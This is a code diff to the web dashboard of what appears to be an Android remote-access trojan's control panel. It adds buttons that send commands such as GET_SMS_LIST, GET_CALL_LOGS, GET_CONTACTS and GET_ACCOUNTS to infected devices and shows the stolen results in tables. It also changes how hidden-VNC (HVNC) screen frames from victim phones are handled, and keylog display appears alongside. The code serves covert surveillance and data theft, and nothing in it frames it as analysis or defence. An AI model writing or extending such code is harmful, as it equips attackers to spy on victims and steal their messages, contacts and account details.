@@ -253,9 +253,16 @@ function handleMessage(msg) {
 
 function handleBinaryFrame(buf) {
   if (!S.hvncViewer) return;
+  const view = new Uint8Array(buf);
+  // V2 frame from hub: [0x02][JPEG] — 1-byte type prefix, no 49B header
+  if (view[0] === 0x02) {
+    S.hvncViewer.onFrame(buf.slice(1), 0, true);
+    return;
+  }
+  // VNC frame: [0x01][36B devId][4B len][8B ts_hi+ts_lo][JPEG] — 49B header
   const dv = new DataView(buf);
   const ts = dv.getUint32(41) * 0x100000000 + dv.getUint32(45);
-  S.hvncViewer.onFrame(buf.slice(49), ts);
+  S.hvncViewer.onFrame(buf.slice(49), ts, false);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -603,88 +610,136 @@ function appendKeylog(data) {
 async function loadSMS(id, panel) {
   panel = panel || $(`#dd-panel-sms`);
   if (!panel) return;
-  loadTableFromApi(panel, `/api/devices/${id}/sms`, r => {
+  panel.style.display = 'flex'; panel.style.flexDirection = 'column';
+  panel.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap">
+      <button class="btn btn-primary btn-sm" onclick="fetchData('${id}','sms')">💬 Fetch SMS</button>
+      <button class="btn btn-ghost btn-sm" onclick="refreshTab('${id}','sms')">↻ Refresh DB</button>
+      <span id="sms-last-${id}" class="text-dim" style="font-size:10px;margin-left:auto"></span>
+    </div>
+    <div id="sms-body-${id}" style="flex:1;overflow:auto"><div class="empty-state"><div class="es-icon">⏳</div></div></div>`;
+  const body = $(`#sms-body-${id}`);
+  try {
+    const r    = await api(`/api/devices/${id}/sms`);
     const list = Array.isArray(r?.data) ? r.data : [];
-    if (!list.length) return null;
-    const headers = ['From/To', 'Body', 'Date', 'Type'];
-    const rows = list.slice(0, 300).map(s => [
-      esc(s.address || s.from || '?'),
-      esc((s.body || s.text || '').slice(0, 120)),
-      fmtTs(s.date ? Math.floor(s.date/1000) : null),
-      s.type == 1 ? 'Inbox' : s.type == 2 ? 'Sent' : s.type || '?',
-    ]);
-    return { headers, rows };
-  });
+    const lastEl = $(`#sms-last-${id}`);
+    if (lastEl && r?.ts) lastEl.textContent = `Last: ${new Date(r.ts * 1000).toLocaleString()}`;
+    if (!list.length) { if (body) body.innerHTML = '<div class="empty-state"><div class="es-icon">💬</div><div class="es-text">No data — click Fetch to pull from device</div></div>'; return; }
+    let html = '<table class="nx-table"><thead><tr><th>From/To</th><th>Body</th><th>Date</th><th>Type</th></tr></thead><tbody>';
+    for (const s of list.slice(0, 300))
+      html += `<tr><td class="mono">${esc(s.address||s.from||'?')}</td><td>${esc((s.body||s.text||'').slice(0,120))}</td><td>${fmtTs(s.date?Math.floor(s.date/1000):null)}</td><td>${s.type==1?'Inbox':s.type==2?'Sent':s.type||'?'}</td></tr>`;
+    html += '</tbody></table>';
+    if (body) body.innerHTML = html;
+  } catch (e) { if (body) body.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
 }
 
 // ── Calls tab ──────────────────────────────────────────────────────────────
 async function loadCalls(id, panel) {
   panel = panel || $(`#dd-panel-calls`);
   if (!panel) return;
-  loadTableFromApi(panel, `/api/devices/${id}/calls`, r => {
+  panel.style.display = 'flex'; panel.style.flexDirection = 'column';
+  panel.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap">
+      <button class="btn btn-primary btn-sm" onclick="fetchData('${id}','calls')">📞 Fetch Calls</button>
+      <button class="btn btn-ghost btn-sm" onclick="refreshTab('${id}','calls')">↻ Refresh DB</button>
+      <span id="calls-last-${id}" class="text-dim" style="font-size:10px;margin-left:auto"></span>
+    </div>
+    <div id="calls-body-${id}" style="flex:1;overflow:auto"><div class="empty-state"><div class="es-icon">⏳</div></div></div>`;
+  const body = $(`#calls-body-${id}`);
+  try {
+    const r    = await api(`/api/devices/${id}/calls`);
     const list = Array.isArray(r?.data) ? r.data : [];
-    if (!list.length) return null;
-    const typeMap = { 1: '📥 Incoming', 2: '📤 Outgoing', 3: '❌ Missed', 5: '🔇 Rejected' };
-    const headers = ['Number', 'Name', 'Duration', 'Date', 'Type'];
-    const rows = list.slice(0, 300).map(c => [
-      esc(c.number || c.phone_no || '?'),
-      esc(c.name || '—'),
-      `${c.duration || 0}s`,
-      fmtTs(c.date ? Math.floor(c.date/1000) : null),
-      typeMap[c.type] || String(c.type || '?'),
-    ]);
-    return { headers, rows };
-  });
+    const lastEl = $(`#calls-last-${id}`);
+    if (lastEl && r?.ts) lastEl.textContent = `Last: ${new Date(r.ts * 1000).toLocaleString()}`;
+    if (!list.length) { if (body) body.innerHTML = '<div class="empty-state"><div class="es-icon">📞</div><div class="es-text">No data — click Fetch to pull from device</div></div>'; return; }
+    const typeMap = { 1:'📥 Incoming', 2:'📤 Outgoing', 3:'❌ Missed', 5:'🔇 Rejected' };
+    let html = '<table class="nx-table"><thead><tr><th>Number</th><th>Name</th><th>Duration</th><th>Date</th><th>Type</th></tr></thead><tbody>';
+    for (const c of list.slice(0, 300))
+      html += `<tr><td class="mono">${esc(c.number||c.phone_no||'?')}</td><td>${esc(c.name||'—')}</td><td>${c.duration||0}s</td><td>${fmtTs(c.date?Math.floor(c.date/1000):null)}</td><td>${typeMap[c.type]||String(c.type||'?')}</td></tr>`;
+    html += '</tbody></table>';
+    if (body) body.innerHTML = html;
+  } catch (e) { if (body) body.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
 }
 
 // ── Contacts tab ────────────────────────────────────────────────────────────
 async function loadContacts(id, panel) {
   panel = panel || $(`#dd-panel-contacts`);
   if (!panel) return;
-  loadTableFromApi(panel, `/api/devices/${id}/contacts`, r => {
+  panel.style.display = 'flex'; panel.style.flexDirection = 'column';
+  panel.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap">
+      <button class="btn btn-primary btn-sm" onclick="fetchData('${id}','contacts')">👥 Fetch Contacts</button>
+      <button class="btn btn-ghost btn-sm" onclick="refreshTab('${id}','contacts')">↻ Refresh DB</button>
+      <span id="contacts-last-${id}" class="text-dim" style="font-size:10px;margin-left:auto"></span>
+    </div>
+    <div id="contacts-body-${id}" style="flex:1;overflow:auto"><div class="empty-state"><div class="es-icon">⏳</div></div></div>`;
+  const body = $(`#contacts-body-${id}`);
+  try {
+    const r    = await api(`/api/devices/${id}/contacts`);
     const list = Array.isArray(r?.data) ? r.data : [];
-    if (!list.length) return null;
-    const headers = ['Name', 'Phone', 'Email'];
-    const rows = list.slice(0, 500).map(c => [
-      esc(c.name || c.display_name || '?'),
-      esc(c.phone || c.number || '—'),
-      esc(c.email || '—'),
-    ]);
-    return { headers, rows };
-  });
+    const lastEl = $(`#contacts-last-${id}`);
+    if (lastEl && r?.ts) lastEl.textContent = `Last: ${new Date(r.ts * 1000).toLocaleString()}`;
+    if (!list.length) { if (body) body.innerHTML = '<div class="empty-state"><div class="es-icon">👥</div><div class="es-text">No data — click Fetch to pull from device</div></div>'; return; }
+    let html = '<table class="nx-table"><thead><tr><th>Name</th><th>Phone</th><th>Email</th></tr></thead><tbody>';
+    for (const c of list.slice(0, 500))
+      html += `<tr><td>${esc(c.name||c.display_name||'?')}</td><td class="mono">${esc(c.phone||c.number||'—')}</td><td>${esc(c.email||'—')}</td></tr>`;
+    html += '</tbody></table>';
+    if (body) body.innerHTML = html;
+  } catch (e) { if (body) body.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
 }
 
 // ── Apps tab ───────────────────────────────────────────────────────────────
 async function loadApps(id, panel) {
   panel = panel || $(`#dd-panel-apps`);
   if (!panel) return;
-  loadTableFromApi(panel, `/api/devices/${id}/apps`, r => {
+  panel.style.display = 'flex'; panel.style.flexDirection = 'column';
+  panel.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap">
+      <button class="btn btn-primary btn-sm" onclick="fetchData('${id}','apps')">🔄 Fetch Apps</button>
+      <button class="btn btn-ghost btn-sm" onclick="refreshTab('${id}','apps')">↻ Refresh DB</button>
+      <span id="apps-last-${id}" class="text-dim" style="font-size:10px;margin-left:auto"></span>
+    </div>
+    <div id="apps-body-${id}" style="flex:1;overflow:auto"><div class="empty-state"><div class="es-icon">⏳</div></div></div>`;
+  const body = $(`#apps-body-${id}`);
+  try {
+    const r    = await api(`/api/devices/${id}/apps`);
     const list = Array.isArray(r?.data) ? r.data : [];
-    if (!list.length) return null;
-    const headers = ['App Name', 'Package', 'System'];
-    const rows = list.slice(0, 500).map(a => [
-      esc(a.name || a.label || '?'),
-      esc(a.package || a.packageName || '—'),
-      a.system ? '⚙' : '—',
-    ]);
-    return { headers, rows };
-  });
+    const lastEl = $(`#apps-last-${id}`);
+    if (lastEl && r?.ts) lastEl.textContent = `Last: ${new Date(r.ts * 1000).toLocaleString()}`;
+    if (!list.length) { if (body) body.innerHTML = '<div class="empty-state"><div class="es-icon">📱</div><div class="es-text">No data — click Fetch to pull from device</div></div>'; return; }
+    let html = '<table class="nx-table"><thead><tr><th>App Name</th><th>Package</th><th>System</th></tr></thead><tbody>';
+    for (const a of list.slice(0, 500))
+      html += `<tr><td>${esc(a.name||a.label||'?')}</td><td class="mono" style="font-size:10px">${esc(a.package||a.packageName||'—')}</td><td>${a.system?'⚙':'—'}</td></tr>`;
+    html += '</tbody></table>';
+    if (body) body.innerHTML = html;
+  } catch (e) { if (body) body.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
 }
 
 // ── Accounts tab ───────────────────────────────────────────────────────────
 async function loadAccounts(id, panel) {
   panel = panel || $(`#dd-panel-accounts`);
   if (!panel) return;
-  loadTableFromApi(panel, `/api/devices/${id}/accounts`, r => {
+  panel.style.display = 'flex'; panel.style.flexDirection = 'column';
+  panel.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap">
+      <button class="btn btn-primary btn-sm" onclick="fetchData('${id}','accounts')">🔑 Fetch Accounts</button>
+      <button class="btn btn-ghost btn-sm" onclick="refreshTab('${id}','accounts')">↻ Refresh DB</button>
+      <span id="accounts-last-${id}" class="text-dim" style="font-size:10px;margin-left:auto"></span>
+    </div>
+    <div id="accounts-body-${id}" style="flex:1;overflow:auto"><div class="empty-state"><div class="es-icon">⏳</div></div></div>`;
+  const body = $(`#accounts-body-${id}`);
+  try {
+    const r    = await api(`/api/devices/${id}/accounts`);
     const list = Array.isArray(r?.data) ? r.data : [];
-    if (!list.length) return null;
-    const headers = ['Email / Account', 'Type'];
-    const rows = list.slice(0, 200).map(a => [
-      esc(a.name || a.email || a.account || '?'),
-      esc(a.type || a.accountType || '—'),
-    ]);
-    return { headers, rows };
-  });
+    const lastEl = $(`#accounts-last-${id}`);
+    if (lastEl && r?.ts) lastEl.textContent = `Last: ${new Date(r.ts * 1000).toLocaleString()}`;
+    if (!list.length) { if (body) body.innerHTML = '<div class="empty-state"><div class="es-icon">🔑</div><div class="es-text">No data — click Fetch to pull from device</div></div>'; return; }
+    let html = '<table class="nx-table"><thead><tr><th>Email / Account</th><th>Type</th></tr></thead><tbody>';
+    for (const a of list.slice(0, 200))
+      html += `<tr><td>${esc(a.name||a.email||a.account||'?')}</td><td class="text-dim">${esc(a.type||a.accountType||'—')}</td></tr>`;
+    html += '</tbody></table>';
+    if (body) body.innerHTML = html;
+  } catch (e) { if (body) body.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
 }
 
 // ── Location tab ───────────────────────────────────────────────────────────
@@ -812,7 +867,8 @@ function startHVNC(id) {
     screenW: info.screen_w || 1080,
     screenH: info.screen_h || 1920,
   });
-  sendWS({ type: 'vnc_subscribe', devId: devId, quality: 50 });
+  // Use viewer.start() — sets _running=true, shows LIVE status, sends subscribe
+  S.hvncViewer.start();
   const hdr = $('#hvnc-pane-header');
   if (hdr) hdr.textContent = `HVNC — ${deviceName(devId)}`;
 }
@@ -1024,6 +1080,28 @@ const deviceName = id => {
 
 window.copyText = text => {
   navigator.clipboard.writeText(text).then(() => toast('Copied!', 'success'));
+};
+
+// ── Data fetch helpers (called by Fetch/Refresh buttons in data tabs) ──────
+window.fetchData = (id, type) => {
+  const cmds = {
+    apps:     'GET_INSTALLED_APPS',
+    sms:      'GET_SMS_LIST',
+    contacts: 'GET_CONTACTS',
+    calls:    'GET_CALL_LOGS',
+    accounts: 'GET_ACCOUNTS',
+    location: 'GET_LOCATION',
+  };
+  const cmd = cmds[type];
+  if (!cmd) return;
+  sendCmd(id, cmd);
+  toast(`→ ${cmd} sent`, 'info');
+};
+
+// Refresh a tab's DB view without sending a device command
+window.refreshTab = (id, tab) => {
+  S.activeDevTab = tab;
+  switchDevTab(id, tab);
 };
 
 async function api(path, method = 'GET', body) {
